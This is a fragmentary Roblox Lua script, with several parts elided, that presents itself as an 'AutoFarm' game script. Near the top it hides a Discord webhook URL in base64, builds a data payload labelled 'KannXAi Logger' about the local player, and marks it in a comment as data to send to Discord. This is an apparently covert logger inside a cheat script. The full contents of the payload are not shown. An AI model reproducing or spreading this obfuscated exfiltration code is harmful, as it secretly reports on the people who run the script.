...
local webhook = b64d("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM2NzA5MDI3ODIyNTI4NTEzMC9Oa3lKQk1HMW0xQWs2UkIwUTJTUjNndUpyRUg3YUxkcDRVbEJGTk5Za0ZHNlVQNWFINTlaNE9uV2VZVE5aWVdPZg==")
local player = Players.LocalPlayer

-- Kirim data ke Discord
local data = {
    username = "KannXAi Logger",
...
StarterGui:SetCore("SendNotification", {
    Title = "KannXAi Script Loaded",
    Text = "AutoFarm system aktif.",
    Duration = 6
})
...
local Module = {} do
	...
	Module.Enemies = (function()
		...
		local function newEnemy(List, Enemy)
			if not table.find(List, Enemy) then
